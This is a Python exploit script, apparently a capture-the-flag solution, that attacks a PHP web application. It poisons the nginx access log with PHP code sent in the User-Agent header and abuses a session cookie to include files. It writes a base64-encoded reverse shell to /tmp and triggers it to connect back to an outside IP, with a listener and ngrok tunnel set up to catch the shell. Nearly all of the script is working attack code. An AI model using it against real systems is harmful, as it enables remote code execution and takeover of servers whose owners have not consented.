import requests
import os
import socket
from pyngrok import ngrok
import base64
import threading
import re
from pwn import *

TARGET_URL = 'http://127.0.0.1:1337'
#TARGET_URL = 'http://188.166.169.77:31435'
HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65432        # Port to listen on (non-privileged ports are > 1023)


def tunnel():
    ssh_tunnel = ngrok.connect(PORT, "tcp")
    return ssh_tunnel.public_url


def close_tunnel(http_tunnel_url):
    ngrok.disconnect(http_tunnel_url)

class SocketThread(threading.Thread):
    def __init__(self,threadID,name):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.done=""
        self.ch=""
    def run(self):
        self.ch=pwn_listen()
        self.done="done"

def connect():
    # Open a HTTP tunnel on the default port 80
    # <NgrokTunnel: "http://<public_sub>.ngrok.io" -> "http://localhost:80">

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, PORT))
            s.listen()
            print('Listening')
            s.settimeout(30)
            conn, addr = s.accept()
            print(addr)
            while True:
                received=conn.recv(1024).decode("utf-8")
                if received:
                    print(received,end='')
                toSend = input()
                toSend = toSend+"\n"
                if toSend=='':
                    break
                toSend=bytes(toSend,"UTF-8")
                conn.sendall(toSend)
                #conn.sendall(bytes(toSend, "utf-8"))
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except Exception as e:
            print(e)
            return ""


def getFileCookie(f):
    cookie = os.popen('php file.php -f'+f).read()
    return cookie


def uploadShell(filename):
    data = open('reverse_shell.php').read()
    data = data.encode("ascii")
    data = base64.b64encode(data)
    data = data.decode("ascii")
    fcookie = getFileCookie('/var/log/nginx/access.log')
    payload = "<?php $file='/tmp/{filename}'; file_put_contents($file,base64_decode('{data}')); ?>".format(
        filename=filename, data=data)
    headers = {"Cookie": "PHPSESSID={fcookie}".format(fcookie=fcookie),
               "User-Agent": payload}
    res = requests.get(TARGET_URL, headers=headers)
    #print(res.text)
    headers = {"Cookie": "PHPSESSID={fcookie}".format(fcookie=fcookie)}
    res2 = requests.get(TARGET_URL, headers=headers)
    #print(res2.text)


def openShell(filename,ip,port):
    fcookie=getFileCookie('/tmp/{filename}'.format(filename=filename))
    print(fcookie)
    payload='/?ip={ip}&port={port}'.format(ip=ip,port=port)
    headers = {"Cookie": "PHPSESSID={fcookie}".format(fcookie=fcookie)}

    res=requests.get(TARGET_URL+payload, headers=headers)
    print(res.text)

def hack():
    uploadShell('navy.php')
    #sock=SocketThread(1,"SocketThread")
    #sock.start()
    #tun=tunnel()
    #url=re.search('(?P<protocol>\w+)://(?P<ip>[\w\-\.]+):(?P<port>[0-9]+)', tun)
    #url=url.groupdict()
    #print(url)
    #openShell('navy.php',url['ip'],url['port'])
    print("Getting shell...")
    openShell('navy.php','10.10.16.36',4444)

def pwn_listen():
    lport=65432
    io=listen(lport).wait_for_connection()
    io.interactive()


hack()